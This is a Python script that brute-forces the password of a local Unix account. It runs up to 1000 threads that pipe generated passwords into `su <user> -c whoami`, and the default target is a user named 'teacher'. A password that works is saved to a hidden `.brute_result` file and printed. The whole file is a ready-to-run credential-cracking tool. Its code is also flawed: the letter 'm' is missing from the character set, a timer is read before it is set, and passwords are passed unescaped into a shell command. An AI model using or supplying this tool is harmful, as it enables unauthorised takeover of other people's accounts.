import os, time, threading

def main():
    user = inputWithDefaultValue('User', 'teacher')
    threadsCount = int(inputWithDefaultValue('Threads count', '1000'))
    global minLength
    minLength = int(inputWithDefaultValue('Minimal password length', '5'))
    
    # TODO: start brute threads 

    for i in range(threadsCount):
        threading.Thread(target=brute, args=(user,)).start()

    global t1
    t1 = time.time()
    
chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
         'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
         'k', 'l', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
         'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E',
         'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
         'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
         'Z']#, '\\`', '~', '\\!', '@', '\\"', '#', '\\$', '%',
         #'^', '&', '*', '(', ')', '-', '_', '=', '+', '\\',
         #'/', '<', '>', ',', '.', ';', ':', "\\'"]
global passwdFound
passwdFound = False
global maxValue
maxValue = 0
global t1
global minLength

def brute(user):
    global t1
    global maxValue
    global passwdFound
    while not passwdFound:
        localValue = maxValue
        maxValue += 8
        xs = getXsByValue(localValue)
        for i in range(8):
            if passwdFound:
                break
            passwd = getPasswd(xs)
            if os.system(f'echo "{passwd}" | su {user} -c "whoami" >/dev/null 2>&1') == 0:
                passwdFound = True
                os.system('touch .brute_result')
                f = open('.brute_result', 'a')
                f.write(f'==> BRUTEFORCE DONE IN {int(time.time() - t1)} SEC\n')
                f.write(f'    CHECKED {maxValue} PASSWORDS\n')
                f.write(f'    PASSWORD FOR {user} IS {passwd}\n')
                f.close()
                time.sleep(30)
                os.system('clear')
                f = open('.brute_result', 'r')
                print(f.read())
                f.close()
            else:
                print(f'| Misfortune with {passwd}')
                localValue += 1
                xs = getXsByValue(localValue)


def getXsByValue(value):
    xs = [value]
    while xs[0] >= len(chars):
        xs.insert(0, xs[0] // len(chars))
        xs[1] %= len(chars)
    global minLength
    if len(xs) < minLength:
        xs = [0] * (minLength - len(xs)) + xs
    return xs
    
def getPasswd(xs):
    return ''.join([chars[i] for i in xs])

def inputWithDefaultValue(prompt, default):
    a = input(f'{prompt}? [{default}]\n> ')
    return default if a == "" else a

if __name__ == "__main__":
    main()
